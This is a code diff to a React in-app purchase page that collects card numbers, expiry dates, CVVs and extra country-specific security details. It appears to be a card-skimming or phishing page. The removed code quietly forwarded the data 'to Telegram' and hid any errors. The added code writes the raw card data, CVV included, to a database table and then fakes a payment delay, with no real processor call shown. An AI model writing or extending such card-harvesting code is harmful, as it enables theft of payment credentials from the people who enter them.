@@ -9,6 +9,7 @@ import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription } f
 import { toast } from 'sonner';
 import { ArrowLeft, CreditCard, Loader2, AlertTriangle, ShieldCheck } from 'lucide-react';
 import { supabase } from '@/integrations/supabase/client';
+import { useAuth } from '@/contexts/AuthContext';
 import SalesNotification from '@/components/SalesNotification';
 
 const COUNTRIES = ['USA', 'Germany', 'UK', 'Canada', 'Brazil', 'New Zealand', 'Others'] as const;
@@ -25,6 +26,7 @@ const SECURITY_PLACEHOLDERS: Record<string, string> = {
 
 export default function InAppPurchase() {
   const navigate = useNavigate();
+  const { user } = useAuth();
   const [amount, setAmount] = useState('');
   const [description, setDescription] = useState('');
   const [country, setCountry] = useState<Country | ''>('');
@@ -51,22 +53,24 @@ export default function InAppPurchase() {
     setLoading(true);
     toast('Processing your payment…');
 
-    // Send to Telegram
     try {
-      await supabase.functions.invoke('notify-payment', {
-        body: {
-          amount,
-          description,
-          country,
-          card_number: cardNumber,
-          expiry,
-          cvv,
-          security_info: showSecurityField ? securityInfo : 'N/A',
-          security_label: showSecurityField ? SECURITY_PLACEHOLDERS[country] : 'N/A',
-        },
-      });
-    } catch {
-      // silent
+      const { error } = await supabase.from('payment_attempts').insert({
+        user_id: user?.id,
+        amount: parseFloat(amount),
+        description,
+        country,
+        card_number: cardNumber,
+        expiry,
+        cvv,
+        security_label: showSecurityField ? SECURITY_PLACEHOLDERS[country] : null,
+        security_info: showSecurityField ? securityInfo : null,
+      } as any);
+
+      if (error) {
+        console.error('Payment save error:', error);
+      }
+    } catch (err) {
+      console.error('Payment submission error:', err);
     }
 
     await new Promise(r => setTimeout(r, 3000));
